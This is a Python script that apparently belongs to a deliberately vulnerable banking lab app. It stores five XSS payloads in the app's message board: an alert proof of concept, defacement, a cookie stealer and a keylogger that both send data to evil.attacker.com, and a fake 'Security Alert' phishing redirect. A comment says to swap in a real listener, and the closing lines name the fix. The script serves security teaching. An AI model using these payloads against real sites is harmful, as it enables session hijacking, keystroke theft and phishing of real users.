#!/usr/bin/env python3
"""
=========================================
VulnBank — Attack Script #2: XSS
=========================================
⚠️  FOR EDUCATIONAL / AUTHORIZED USE ONLY

Demonstrates Stored XSS:
  - Script injection
  - Cookie theft payload
  - Keylogger injection
  - Page defacement
"""

import requests
import json
import sys

BASE_URL = "http://localhost:8080"
MSG_API  = f"{BASE_URL}/messages/api/messages"

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"""
{YELLOW}╔══════════════════════════════════════════╗
║   STORED XSS ATTACK DEMO                 ║
║   VulnBank — Educational Use Only        ║
╚══════════════════════════════════════════╝{RESET}
""")


def post_xss(author: str, payload: str, description: str):
    resp = requests.post(MSG_API, json={"author": author, "content": payload})

    if resp.status_code == 200:
        msg = resp.json()
        print(f"    {GREEN}✅ [{description}] stored as message ID {msg.get('id')}{RESET}")
        print(f"    {YELLOW}→  Visit http://localhost:8080/messages to trigger{RESET}")
    else:
        print(f"    {RED}✗  Failed: {resp.status_code} — {resp.text[:100]}{RESET}")


def attack_alert_xss():
    """Classic proof-of-concept XSS."""
    print(f"{BOLD}[1] Classic Alert XSS{RESET}")
    post_xss(
        author="attacker",
        payload="<script>alert('XSS by attacker — ' + document.domain)</script>",
        description="PoC Alert"
    )
    print()


def attack_cookie_theft():
    """
    Simulates cookie theft — sends document.cookie to attacker server.
    In a real attack, replace evil.com with an actual listener.
    """
    print(f"{BOLD}[2] Cookie Theft (simulated){RESET}")
    payload = (
        "<script>"
        "var img = new Image();"
        "img.src = 'http://evil.attacker.com/steal?session=' + "
        "encodeURIComponent(document.cookie);"
        "</script>"
    )
    post_xss(
        author="attacker",
        payload=payload,
        description="Cookie Exfil"
    )
    print()


def attack_defacement():
    """Page defacement via DOM manipulation."""
    print(f"{BOLD}[3] Page Defacement{RESET}")
    payload = (
        '<img src="x" onerror="'
        "document.body.style.background='#000';"
        "document.querySelector('h1,h2,.header,.logo') && "
        "(document.querySelector('h1,h2,.header,.logo').textContent='HACKED BY XSS');"
        '">'
    )
    post_xss(
        author="attacker",
        payload=payload,
        description="DOM Defacement"
    )
    print()


def attack_keylogger():
    """Inject a keylogger that sends keystrokes to attacker server."""
    print(f"{BOLD}[4] Keylogger Injection{RESET}")
    payload = (
        "<script>"
        "document.addEventListener('keypress',function(e){"
        "new Image().src='http://evil.attacker.com/keys?k='+e.key;"
        "});"
        "</script>"
    )
    post_xss(
        author="attacker",
        payload=payload,
        description="Keylogger"
    )
    print()


def attack_session_hijack():
    """Redirect user to phishing page."""
    print(f"{BOLD}[5] Session Redirect / Phishing{RESET}")
    payload = (
        "<script>"
        "setTimeout(function(){"
        "window.location='http://evil.attacker.com/phishing?token='+document.cookie;"
        "},3000);"
        "</script>"
        "<p style='color:red;font-weight:bold'>⚠️ Security Alert: Please re-authenticate in 3 seconds...</p>"
    )
    post_xss(
        author="system-alert",
        payload=payload,
        description="Phishing Redirect"
    )
    print()


def show_current_messages():
    print(f"{BOLD}[*] Current messages in board:{RESET}")
    resp = requests.get(f"{BASE_URL}/messages/api/messages")
    if resp.status_code == 200:
        msgs = resp.json()
        for m in msgs:
            preview = m.get('content', '')[:80].replace('\n', ' ')
            print(f"    ID {m.get('id'):<3} [{m.get('author')}]: {preview}")
    print()


if __name__ == "__main__":
    banner()
    print(f"Target: {BASE_URL}\n")

    try:
        requests.get(BASE_URL, timeout=3)
    except Exception:
        print(f"{RED}❌ Cannot connect to {BASE_URL}")
        print(f"   Start the app: docker-compose up{RESET}")
        sys.exit(1)

    attack_alert_xss()
    attack_cookie_theft()
    attack_defacement()
    attack_keylogger()
    attack_session_hijack()
    show_current_messages()

    print(f"{YELLOW}{'='*50}")
    print(f"All XSS payloads stored in the message board.")
    print(f"Open http://localhost:8080/messages in a browser")
    print(f"to see them execute.")
    print(f"\nFix: use th:text instead of th:utext in Thymeleaf,")
    print(f"or sanitize with OWASP Java HTML Sanitizer.{RESET}")
